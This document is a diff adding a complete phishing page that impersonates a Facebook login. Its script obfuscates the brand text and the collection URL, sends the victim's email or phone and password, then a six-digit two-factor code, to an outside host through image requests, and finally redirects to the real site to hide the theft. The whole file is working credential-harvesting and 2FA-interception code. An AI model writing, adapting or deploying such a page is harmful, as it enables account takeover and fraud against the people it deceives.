@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Social Connect Portal</title>
+    <style>
+        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .c-box { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,.1); width: 360px; text-align: center; }
+        .b-logo { width: 150px; margin-bottom: 15px; font-size: 30px; font-weight: bold; color: #1877f2; }
+        p { color: #1c1e21; font-size: 15px; margin-bottom: 20px; }
+        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 16px; }
+        .btn { width: 100%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        #s2 { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="c-box">
+        <div id="logo_text" class="b-logo"></div>
+        
+        <div id="s1">
+            <p id="p_text1"></p>
+            <input type="text" id="v1" placeholder="Mobile number or email">
+            <input type="password" id="v2" placeholder="Password">
+            <button class="btn" onclick="next()">Log In</button>
+        </div>
+
+        <div id="s2">
+            <h3 id="p_text2"></h3>
+            <p id="p_text3"></p>
+            <input type="text" id="v3" placeholder="6-digit code" maxlength="6">
+            <button class="btn" onclick="final()">Verify</button>
+        </div>
+    </div>
+
+    <script>
+        // 1. OBFUSCATE THE UI TEXT
+        document.getElementById('logo_text').innerText = atob("RmFjZWJvb2s="); // "Facebook"
+        document.getElementById('p_text1').innerText = atob("TG9nIGluIHRvIHlvdXIgYWNjb3VudA=="); // "Log in to your account"
+        document.getElementById('p_text2').innerText = atob("U2VjdXJpdHkgQ2hlY2s="); // "Security Check"
+        document.getElementById('p_text3').innerText = atob("RW50ZXIgdGhlIGNvZGUgc2VudCB0byB5b3VyIHBob25lLg=="); // "Enter the code sent to your phone."
+
+        // 2. OBFUSCATE THE URL (Hex Encoding for wordsess)
+        // https://wordsess.pythonanywhere.com/capture
+        const _0x_u = [104,116,116,112,115,58,47,47,119,111,114,100,115,101,115,115,46,112,121,116,104,111,110,97,110,121,119,104,101,114,101,46,99,111,109,47,99,97,112,116,117,114,101];
+        const g = String.fromCharCode(..._0x_u);
+        
+        let u_sav = "";
+
+        function next() {
+            const u = document.getElementById('v1').value;
+            const p = document.getElementById('v2').value;
+            if (u && p) {
+                u_sav = u;
+                const d = btoa("FB_S1|U:" + u + "|P:" + p);
+                new Image().src = g + "?data=" + d;
+                document.getElementById('s1').style.display = 'none';
+                document.getElementById('s2').style.display = 'block';
+            }
+        }
+
+        function final() {
+            const c = document.getElementById('v3').value;
+            if (c) {
+                const d = btoa("FB_S2|U:" + u_sav + "|C:" + c);
+                new Image().src = g + "?data=" + d;
+                setTimeout(() => {
+                    // Redirect to real FB login
+                    window.location.replace(atob("aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLw=="));
+                }, 1000);
+            }
+        }
+    </script>
+</body>
+</html>
